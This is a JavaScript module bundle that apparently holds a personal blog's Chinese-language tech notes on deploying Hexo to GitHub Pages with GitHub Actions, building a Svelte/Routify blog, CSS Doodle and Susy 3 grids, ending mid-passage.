id=\"b-設定\">b. 設定</h3>\n<p>Repo 母資料夾底下的 <code>_confiy.yml</code> 可以設定如標題、副標、說明等內容</p>\n<pre class=\"language-yml\"><code class=\"language-yml\">title: 部落格標題\nsubtitle: 副標(可留空)\ndescription: 部落格說明\nauthor:\nlanguage: (預設設定為en)\ntimezone: (預設設定為執行電腦上的時區)\n\nurl: http://example.com\nroot: /blog/\npermalink: :year/:month/:day/:title/\npermalink_defaults:</code></pre><h2 id=\"3-正式上線\">3. 正式上線</h2>\n<h3 id=\"a-撰寫文章\">a. 撰寫文章</h3>\n<p>這時已經可以運行如文章新增與預覽的基本功能：</p>\n<ol>\n<li>建立記事：<code>hexo new post-name</code> = <code>hexo n</code><ul>\n<li>（可選）清除暫存：<code>hexo clean</code></li>\n</ul>\n</li>\n<li>產生記事靜態頁面：<code>hexo generate</code> = <code>hexo g</code></li>\n<li>在本地上執行伺服器進行預覽：<code>hexo server</code> = <code>hexo s</code></li>\n</ol>\n<h3 id=\"b-推送\">b. 推送</h3>\n<ol>\n<li><p>安裝推送到 GitHub Pages 的套件：\n<code>npm install hexo-deplyer-git --save</code></p>\n</li>\n<li><p>於 <code>_config.yml</code> 設定 Deploy：</p>\n</li>\n</ol>\n<pre class=\"language-yml\"><code class=\"language-yml\">deploy:\n  type: git\n  repo: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>repository</span> <span class=\"token attr-name\">url</span><span class=\"token punctuation\">></span></span>\n  branch: gh-pages // 只有建置在子網域頁面時才需要</code></pre><ol start=\"3\">\n<li>推送：<code>hexo deploy</code> = <code>hexo d</code><ul>\n<li>生成頁面後即推送：<code>hexo generate --deploy</code> = <code>hexo g -d</code></li>\n</ul>\n</li>\n</ol>\n<p>參考： <a target=\"_blank\" rel=\"nofollow\" href=\"https://hexo.io/zh-tw/docs/deployment\">Hexo - 佈署</a></p>\n<h3 id=\"（可選）c-線上編輯後自動更新\">（可選）c. 線上編輯後自動更新</h3>\n<p>也可以利用 GitHub 所提供的 CI/CD（持續性整合與自動化部署）服務 GitHub Actions，自動化儲存與發表文章的處理</p>\n<ol>\n<li>於 GitHub 上建立一個新專案，push hexo 上去後，將此專案設為 Private</li>\n<li>設立 SSH Key 提供給 GitHub Actions 使用</li>\n</ol>\n<pre class=\"language-bash\"><code class=\"language-bash\">ssh-keygen -f github-deploy-key</code></pre><p>留空點擊兩次 Enter 後，會在 hexo 資料夾底下產生兩個新檔案 <code>github-deply-key</code>（私鑰）與 <code>github-deploy-key.pub</code>（公鑰）</p>\n<ol start=\"3\">\n<li>至原始碼專案的 Settings 的 Secrets 分頁裡，點選 Add a new secret，<ul>\n<li>於 Name 輸入 <code>HEXO_DEPLOY_PRI</code>，Value 輸入私鑰 <code>github-deply-key</code> 裡的內容</li>\n</ul>\n</li>\n<li>至靜態網頁專案的 Settings 的 Deploy keys 分頁裡，<ul>\n<li>於 Title 輸入 <code>HEXO_DEPLOY_PUB</code>，Key 輸入公鑰 <code>github-deploy-key.pub</code> 裡的內容，勾選 Allow write access</li>\n</ul>\n</li>\n<li>開啟 hexo 資料夾裡的 <code>_config.xml</code> 檔案，編輯 <code>deploy</code> 的部份改為 SSH 連線</li>\n</ol>\n<pre class=\"language-xml\"><code class=\"language-xml\">deploy:\n  type: git\n  repo: git@github.com:[YOUR_GITHUB_ACCOUNT/YOUR_STATIC_WEB_REPO_NAME].git\n  branch: master</code></pre><ol start=\"6\">\n<li>推送更新專案</li>\n<li>至原始碼專案頁面的 Actions 分頁，點選右上角的 <code>Set up a workflow yourself</code><ul>\n<li>設定自動部署時要使用的環境與執行的指令，以及 Hexo 所需要的主題和插件安裝</li>\n<li>把 <code>main.yml</code> 推上 <code>workflows/</code> 之後，再次回到 Actions 確認 workflows 是否已更新</li>\n</ul>\n</li>\n</ol>\n<p><code>main.yml</code> 參考：</p>\n<pre class=\"language-yml\"><code class=\"language-yml\">name: Deploy Blog\n\non:\n  push:\n    branches:\n      - master\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    env:\n      HEXO_DEPLOY_PRI: ${{secrets.HEXO_DEPLOY_PRI}}\n      USER_NAME: USER_NAME\n      USER_EMAIL: USER_EMAIL\n\n    strategy:\n      matrix:\n        node-version: [10.x]\n\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v1\n      - name: Use Node.js ${{ matrix.node-version }}\n        uses: actions/setup-node@v1\n        with:\n          node-version: ${{ matrix.node-version }}\n      - name: Setup Hexo\n        run: |\n          mkdir -p ~/.ssh/\n          echo \"$HEXO_DEPLOY_PRI\" > ~/.ssh/id_rsa\n          chmod 600 ~/.ssh/id_rsa\n          ssh-keyscan github.com >> ~/.ssh/known_hosts\n          git config --global user.name $USER_NAME\n          git config --global user.email $USER_EMAIL\n          npm i -g hexo-cli\n          npm i hexo-generator-tag hexo-generator-feed hexo-renderer-ejs hexo-renderer-less hexo-renderer-marked hexo-pagination hexo-all-minifier hexo-autoprefixer hexo-front-matter\n          npm i\n      - name: Deploy\n        run: |\n          hexo g -d</code></pre><ol start=\"8\">\n<li>本地端亦需同步推上建立 <code>main.yml</code> 後的 commit</li>\n</ol>\n<pre class=\"language-bash\"><code class=\"language-bash\">git remote update\ngit pull</code></pre><ol start=\"9\">\n<li>若有修改 blog 的佈景或設定時也需要同部更新原始碼</li>\n</ol>\n<pre class=\"language-bash\"><code class=\"language-bash\">git add --all\ngit commit -m \"update\"\ngit push origin master</code></pre><ol start=\"10\">\n<li>至原始碼專案的 <code>source/_posts</code> 資料夾裡，點選右上角的 <code>Create new file</code>，<ul>\n<li>輸入完文章內容後，點擊 <code>Commit new file</code> 便可線上發布文章了</li>\n</ul>\n</li>\n</ol>\n<h4 id=\"參考\">參考</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.weitw.net/posts/350dd70b/index.html\">Hexo + GitHub Actions 打造自動部署</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gythialy.github.io/deploy-hexo-to-github-pages-via-github-actions/\">通过 GitHub Actions 自动部署 Hexo</a></li>\n</ul>\n<h2 id=\"4-套件\">4. 套件</h2>\n<h3 id=\"a-主題\">a. 主題</h3>\n<ul>\n<li>Apollo (<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/pinggod/hexo-theme-apollo\">hexo-theme-apollo</a>)</li>\n<li>Element (<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/artchen/hexo-theme-element\">hexo-theme-element</a>)</li>\n<li>Modernist (<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/heroicyang/hexo-theme-modernist\">hexo-modernist</a>)</li>\n<li>Light (<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/hexojs/hexo-theme-light\">hexo-theme-light</a>)</li>\n</ul>\n<h3 id=\"b-rss\">b. RSS</h3>\n<p><code>npm install hexo-generator-feed --save</code></p>\n<h3 id=\"c-sitemap\">c. Sitemap</h3>\n<p><code>npm install hexo-generator-seo-friendly-sitemap --save</code></p>\n<p><code>_config.yml</code>設定：</p>\n<pre class=\"language-yml\"><code class=\"language-yml\">sitemap:\n  path: sitemap.xml\n  template: ./sitemap_template.xml</code></pre><h3 id=\"d-壓縮\">d. 壓縮</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mamboer/hexo-filter-cleanup\">Hexo-filter-cleanup</a><ul>\n<li><code>npm install hexo-filter-cleanup --save</code></li>\n</ul>\n</li>\n</ul>\n<p><code>Hexo-filter-cleanup</code>也整合了以下三個插件：</p>\n<ol>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/hexojs/hexo-html-minifier\">hexo-html-minifier</a><ul>\n<li><code>npm install hexo-html-minifier --save</code></li>\n</ul>\n</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/hexojs/hexo-clean-css\">hexo-clean-css</a><ul>\n<li><code>npm install hexo-clean-css --save</code></li>\n</ul>\n</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/hexojs/hexo-uglify\">hexo-uglify</a><ul>\n<li><code>npm install hexo-uglify --save</code></li>\n</ul>\n</li>\n</ol>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/theme-next/hexo-filter-optimize\">hexo-filter-optimize</a><ul>\n<li><code>npm install hexo-filter-optimize --save</code></li>\n</ul>\n</li>\n</ul>\n<p><code>_config.yml</code>設定：</p>\n<pre class=\"language-yml\"><code class=\"language-yml\">filter_optimize:\n  enable: true\n  # remove static resource query string\n  #   - like `?v=1.0.0`\n  remove_query_string: true\n  # remove the surrounding comments in each of the bundled files\n  remove_comments: false\n  css:\n    enable: true\n    # bundle loaded css file into the one\n    bundle: true\n    # use a script block to load css elements dynamically\n    delivery: true\n    # make specific css content inline into the html page\n    #   - only support the full path\n    #   - default is ['css/main.css']\n    inlines:\n    excludes:\n  js:\n    # bundle loaded js file into the one\n    bundle: true\n    excludes:\n  # set the priority of this plugin,\n  # lower means it will be executed first, default is 10\n  priority: 12\n\n  # ---\n\nhtml_minifier:\n  exclude:\n  removeComments: true\n  removeCommentsFromCDATA: false\n  removeCDATASectionsFromCDATA: false\n  collapseWhitespace: true\n  conservativeCollapse: true\n  preserveLineBreaks: true\n  collapseBooleanAttributes: false\n  removeAttributeQuotes: false\n  removeRedundantAttributes: false\n  preventAttributesEscaping: false\n  useShortDoctype: false\n  removeEmptyAttributes: false\n  removeScriptTypeAttributes: false\n  removeStyleLinkTypeAttributes: false\n  removeOptionalTags: false\n  removeIgnored: false\n  removeEmptyElements: false\n  lint: false\n  keepClosingSlash: false\n  caseSensitive: false\n  minifyJS: true\n  minifyCSS: true\n  minifyURLs: false</code></pre><h2 id=\"5-文章編寫-（markdown-記法）\">5. 文章編寫 （Markdown 記法）</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/5I6nEE0aQTGYT1PzTyTBAw\">HackMD 的 Markdown 輸入格式對照表</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/ka215/items/a709665cb34c505ccf1f\">Markdown テキストでシーケンス図とフローチャートを描く</a></li>\n</ul>\n<pre class=\"language-markdown\"><code class=\"language-markdown\"># 主標題\n\n## 副標題\n\n> 引言\n\n- 清單\n- 清單\n\n1. 有序清單\n2. 有序清單\n\n**粗體**\n_斜線_\n~刪除線~\n\n連結\n[an example](http://example.com/ \"Title\")\nThis is [an example][id] reference-style link.\n[id]: http://example.com/ \"Optional Title Here\"\n\n圖片\n![エビフライトライアングル](http://i.imgur.com/Jjwsc.jpg \"サンプル\")\n\n待辦事項\n\n- [ ] Eat\n- [x] Code\n  - [x] HTML\n  - [x] CSS\n  - [x] JavaScript\n- [ ] Sleep\n\n閱讀更多\n\n＜!-- more --＞\n\n嵌入 Youtube 影片\n{%youtube [Youtube影片ID] %}\n\n{%raw%}不需解析的 markdown 原文{%endraw%}</code></pre><h2 id=\"6-補充連結\">6. 補充連結</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/in_silico_/items/7e6ed639c24142bdbd04\">Hexo で始めるお手軽な静的ブログ　-インストールと配備-</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/in_silico_/items/31c2c0bc1cf061c86250\">Hexo で始めるお手軽な静的ブログ　-画像投稿とプラグインの追加-</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://pepese.github.io/blog/hexo-github-pages/\">Hexo で作ったブログを GitHub Pages で公開</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://photo-tea.com/p/usecase-of-hexo-plugin/\">Hexo ブログで使ってるプラグインを公開します</a></li>\n</ul>\n","date":"1970-01-01T00:00:00.000Z","excerpt":"","printDate":"January 1, 1970","printReadingTime":"5 min read"};

var route_53 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod42
});

var Mod43 = {"title":"Blog with Svelte","slug":"blog-with-svelte","html":"<h4 id=\"anchor-links-using-remark-slug\">Anchor links using remark-slug</h4>\n<ul>\n<li><a onclick=\"document.location.hash='前言';\" href=\"javascript:;\">前言</a></li>\n<li><a onclick=\"document.location.hash='安裝-svelte';\" href=\"javascript:;\">安裝 Svelte</a></li>\n<li><a onclick=\"document.location.hash='whats-inside-it';\" href=\"javascript:;\">What&#39;s inside it?</a></li>\n<li><a onclick=\"document.location.hash='how-does-it-work';\" href=\"javascript:;\">How does it work?</a></li>\n</ul>\n<hr>\n<h2 id=\"前言\">前言</h2>\n<p>之前陸續試了幾個能搭配 Markdown 產生網頁的 library，像是 Hexo 或 Gridsome，但對於內容幾乎只是給自己看的雜記的我來說，用起來總覺得有種殺雞用牛刀的感覺，趁著之前也有些許關注的 Svelte 在今年興起熱潮，換了 Routify 的 blog template 來試試使用效果如何。</p>\n<h2 id=\"安裝-svelte\">安裝 Svelte</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">mkdir svelte-md-blog\ncd svelte-md-blog\nnpx @sveltech/routify init --branch blog\nnpm run dev</code></pre><h2 id=\"whats-inside-it\">What&#39;s inside it?</h2>\n<h3 id=\"svelte\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://svelte.dev/\">Svelte</a></h3>\n<p>一套秉持「Write less code」的精神，為了建構 UI 而生的 JavaScript 編譯器，不採用 Virtual DOM diff，而是用原生 JS 直接修改 DOM，擁有相對優秀的執行速度與檔案大小表現。</p>\n<h3 id=\"routify\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://routify.dev/\">Routify</a></h3>\n<p>基於檔案系統結構的 Svelte routing library，因應檔案變更自動產生路由，並具有 SPA、SSR、PWA、產生 Meta Tags、分割 code 的功能。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/sho0211/items/ea99738f69d4426dbb1e\">Routify (Svelte Router) をコードリーディングして完全に理解する - Qiita</a></li>\n</ul>\n<h3 id=\"mdsvex\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://mdsvex.com/\">MDsveX</a></h3>\n<p>可以在 Markdown 裡使用 Svelte component、在 Svelte component 裡使用 Markdown 的 Library。</p>\n<h2 id=\"how-does-it-work\">How does it work?</h2>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> layout<span class=\"token punctuation\">,</span> isActive<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> goto<span class=\"token punctuation\">,</span> page <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@svelte/routify\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">export</span> <span class=\"token keyword\">let</span> node <span class=\"token operator\">=</span> $layout<span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n  {#each node.children as node}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{$url(node.path)}<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">class:</span>active</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{$isActive(node.path)}<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token punctuation\">></span></span>{node.title}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span>\n    <span class=\"token punctuation\">></span></span>\n    {#if node.children.length}\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">svelte:</span>self</span> <span class=\"token attr-name\">{node}</span> <span class=\"token punctuation\">/></span></span>\n    {/if}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  {/each}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"setting-html-metatags\">Setting HTML metatags</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://routify.dev/docs/metatags\">HTML Metatags - Routify</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developers.facebook.com/docs/sharing/webmasters/\">網站管理員 - Sharing</a></li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Metatags</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>og:title</code></td>\n<td>網頁內容的標題，不包含網站名稱等任何品牌內容</td>\n</tr>\n<tr>\n<td><code>og:url</code></td>\n<td>網頁內容的網址，此網址應為標準網址（canonical URL）</td>\n</tr>\n<tr>\n<td><code>og:description</code></td>\n<td>內容的簡短說明，通常為 2 到 4 個句子</td>\n</tr>\n<tr>\n<td><code>og:image</code></td>\n<td>用戶將內容分享至 SNS 時顯示的圖像網址，建議為 <code>1.91:1</code> 比例、最小 <code>1200x630</code> 解析度</td>\n</tr>\n<tr>\n<td><code>og:type</code></td>\n<td>內容的媒體類型，每個網址都應該是單一物件，預設為 <code>website</code></td>\n</tr>\n<tr>\n<td><code>og:locale</code></td>\n<td>資源的地區設定，預設為 <code>en_US</code>，原生內容以非英文撰寫時才需設定</td>\n</tr>\n</tbody></table>\n<p><code>pages\\_layout.svelte</code></p>\n<pre class=\"language-svelte\"><code class=\"language-svelte\">$: metatags.title = $page.meta.frontmatter\n  ? $page.meta.frontmatter[\"title\"]\n  : `${$page.title}`;\n$: metatags.description = $page.meta.frontmatter\n  ? $page.meta.frontmatter[\"summary\"]\n  : \"\";\n\n$: metatags[\"twitter:title\"] = $page.meta.frontmatter\n  ? $page.meta.frontmatter[\"title\"]\n  : `${$page.title}`;\n$: metatags[\"twitter:description\"] = $page.meta.frontmatter\n  ? $page.meta.frontmatter[\"summary\"]\n  : \"\";</code></pre><h2 id=\"deploy\">Deploy</h2>\n","date":"1970-01-02T00:00:00.000Z","excerpt":"","printDate":"January 2, 1970","printReadingTime":"2 min read"};

var route_51 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod43
});

var Mod44 = {"title":"CSS Doodle","slug":"css-doodle","html":"<h2 id=\"example\">Example</h2>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/f6bfb5/pen/PoqNWZa\">https://codepen.io/f6bfb5/pen/PoqNWZa</a>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/0x010C/pen/QWwPGWm\">https://codepen.io/0x010C/pen/QWwPGWm</a></p>\n<pre class=\"language-\"><code class=\"language-\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>css-doodle</span><span class=\"token punctuation\">></span></span>\n  :doodle {\n    @grid: 5;\n    @size: 30vmax; grid-gap: 1px;\n    background: #f5f5f5;\n    }\n  background-color: hsla(@r(0,360), 70%, 70%, @r(.1,1));\n  transform: scale(@rand(0.2, 1));\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>css-doodle</span><span class=\"token punctuation\">></span></span></code></pre><ul>\n<li><code>:doodle</code>: <code>css-doodle</code> 元素</li>\n<li><code>@grid</code>: 畫布 5x5</li>\n<li><code>@size</code>: 單個圖案大小</li>\n<li><code>grid-gap</code>: 圖案間距</li>\n<li><code>@nth</code> ,<code>@even</code>, <code>@odd</code>, <code>@at</code>: 指定特定座標圖案</li>\n<li><code>@use</code>: 樣式可撰寫於 <code>css-doodle</code> 標籤內或是 <code>style</code> 裡</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>css-doodle</span><span class=\"token punctuation\">></span></span> @use: var(--rule-a); <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>css-doodle</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-css\"><code class=\"language-css\"><span class=\"token selector\">:root</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token selector\">--rule-a</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token selector\">:doodle</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token atrule\"><span class=\"token rule\">@grid</span><span class=\"token punctuation\">:</span> 5<span class=\"token punctuation\">;</span></span>\n      <span class=\"token atrule\"><span class=\"token rule\">@size</span><span class=\"token punctuation\">:</span> 30vmax<span class=\"token punctuation\">;</span></span>\n      <span class=\"token property\">grid-gap</span><span class=\"token punctuation\">:</span> 1px<span class=\"token punctuation\">;</span>\n      <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #f5f5f5<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> <span class=\"token function\">hsla</span><span class=\"token punctuation\">(</span><span class=\"token atrule\"><span class=\"token rule\">@r</span> <span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">,</span> 360<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> 70%<span class=\"token punctuation\">,</span> 70%<span class=\"token punctuation\">,</span> <span class=\"token atrule\"><span class=\"token rule\">@r</span> <span class=\"token punctuation\">(</span>0.1<span class=\"token punctuation\">,</span> 1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span><span class=\"token atrule\"><span class=\"token rule\">@rand</span> <span class=\"token punctuation\">(</span>0.2<span class=\"token punctuation\">,</span> 1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre><p><code>@place-cell</code>: 以母元素做為相對位置</p>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token atrule\"><span class=\"token rule\">@size</span><span class=\"token punctuation\">:</span> 1.6em<span class=\"token punctuation\">;</span></span>\n<span class=\"token atrule\"><span class=\"token rule\">@nth</span> <span class=\"token punctuation\">(</span>1<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token atrule\"><span class=\"token rule\">@place-cell</span><span class=\"token punctuation\">:</span> 0 top<span class=\"token punctuation\">;</span></span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@nth</span> <span class=\"token punctuation\">(</span>2<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token atrule\"><span class=\"token rule\">@place-cell</span><span class=\"token punctuation\">:</span> right 25%<span class=\"token punctuation\">;</span></span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@nth</span> <span class=\"token punctuation\">(</span>3<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token atrule\"><span class=\"token rule\">@place-cell</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span></span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@nth</span> <span class=\"token punctuation\">(</span>4<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token atrule\"><span class=\"token rule\">@place-cell</span><span class=\"token punctuation\">:</span> .8em <span class=\"token function\">calc</span><span class=\"token punctuation\">(</span>100% - .8em<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@nth</span> <span class=\"token punctuation\">(</span>5<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token atrule\"><span class=\"token rule\">@place-cell</span><span class=\"token punctuation\">:</span> 75% 80%<span class=\"token punctuation\">;</span></span>\n<span class=\"token punctuation\">}</span></code></pre>","date":"2020-02-16T06:31:34.000Z","excerpt":"","printDate":"February 16, 2020","printReadingTime":"1 min read"};

var route_66 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod44
});

var Mod45 = {"title":"CSS Susy 3","slug":"css-susy3","html":"<p>Susy 3 是一套用於快速計算網格分割尺寸用的工具。</p>\n<h3 id=\"安裝\">安裝</h3>\n<ol>\n<li>npm</li>\n</ol>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.oddbird.net/susy/docs/\">Offical Document</a></li>\n</ul>\n<p><code>npm install susy</code></p>\n<p>有 <code>無前綴詞彙</code> 與 <code>附前綴詞彙</code> 的兩種版本可以使用。</p>\n<pre class=\"language-\"><code class=\"language-\">// 無前綴版\n@import '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>path-to</span><span class=\"token punctuation\">></span></span>/susy/sass/susy';\n\n// 附前綴版\n@import '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>path-to</span><span class=\"token punctuation\">></span></span>/susy/sass/susy-prefix';</code></pre><p>除錯用網格背景上色</p>\n<pre class=\"language-\"><code class=\"language-\">// 無前綴版\n@import '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>path-to</span><span class=\"token punctuation\">></span></span>/susy/sass/plugins/svg-grid';\n\n// 附前綴版\n@import '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>path-to</span><span class=\"token punctuation\">></span></span>/susy/sass/plugins/svg-grid/prefix';\n\n.container {\n  background: susy-svg-grid() no-repeat scroll;\n}</code></pre><ol start=\"2\">\n<li>webpack</li>\n</ol>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://jsnwork.kiiuo.com/archives/2803/css-susy3-%e5%ae%89%e8%a3%9d%e6%95%99%e5%ad%b81%ef%bc%8c%e9%80%8f%e9%81%8e-webpack-%e5%be%9e%e9%a0%ad%e9%96%8b%e5%a7%8b%e5%bb%ba%e7%ab%8b%e6%9e%b6%e6%a7%8b/\">CSS – SUSY3 – 安裝教學(1)，透過 webpack 從頭開始建立架構</a></li>\n</ul>\n<ol start=\"3\">\n<li>Codepen</li>\n</ol>\n<p>將預處理器改為 SCSS ，在 CSS 來源裡引入這兩個 pen：\nSusy 3 - Codepen\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/mirisuzanne/pen/awdMoa\">https://codepen.io/mirisuzanne/pen/awdMoa</a>\nSusy 3 SVG Image Plugin - Codepen\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/mirisuzanne/pen/QgyoWp\">https://codepen.io/mirisuzanne/pen/QgyoWp</a></p>\n<h3 id=\"設定變數\">設定變數</h3>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.oddbird.net/2017/06/28/susy3/\">Welcome to Susy3!</a></p>\n<h4 id=\"1-columns-格線佈局的水平空間\">1. <code>$columns</code> 格線佈局的水平空間</h4>\n<p>對應至 CSS 網格系統的 <code>$grid-template-columns</code>，設定切分成幾份欄位。</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">// 對稱的 layouts\n$grid-template-columns: repeat(12, 120px);\n$columns: susy-repeat(12, 120px);\n\n// 不對稱的混合 layouts\n$grid-template-columns: 120px repeat(4, 1fr) 30em;\n$columns: 120px susy-repeat(4) 30em;</code></pre><p>CSS 網格系統在流動欄位上使用 <code>fr</code> 單位， Susy 裡則使用無單位數字，即 <code>susy-repeat(4)</code> 會創造一個 4 格的流動網格，等同於設定為 <code>1 1 1 1</code>。</p>\n<p>例如：</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">// 經典的 12 格網格 (兩者結果相同)\n$columns: susy-repeat(12, 5em);\n$columns: 5em 5em 5em 5em 5em 5em 5em 5em 5em 5em 5em 5em;\n\n// 聖杯狀網格\n$columns: 12em 1 200px;\n\n// 中間區域增加更多欄位的聖杯狀網格\n$columns: 12em susy-repeat(4) 200px;\n$columns: 12em 1 1 1 1 200px;\n\n//輪替重覆的欄位\n$columns: susy-repeat(3, 8em, 200px);</code></pre><p>Susy 不會直接修改 DOM，而是使用 <code>calc()</code> 替不相容與流動式的網格產生內容。</p>\n<h4 id=\"2-gutters-格線間隔\">2. <code>$gutters</code> 格線間隔</h4>\n<p>對應至 CSS 網格系統的 <code>grid-column-gap</code>，設定欄位之間的間隔大小。</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">// 流動式間隔\n$gutters: 0.25;\n\n// 固定間隔\n$gutters: 10px;</code></pre><h4 id=\"3-spread-與-container-spread\">3. <code>&#39;spread&#39;</code> 與 <code>&#39;container-spread&#39;</code></h4>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.oddbird.net/2017/06/13/susy-spread/\">Understanding Spread in Susy3</a></p>\n<p><code>spread</code> 有三個值，用以調整元素與 container 欄位的間隔設定，通常情況下只會用到前兩種，分別是 <code>narrow</code> 、 <code>wide</code> 、 <code>wider</code>，預設值為 <code>narrow</code>。</p>\n<ol>\n<li><code>narrow</code> : 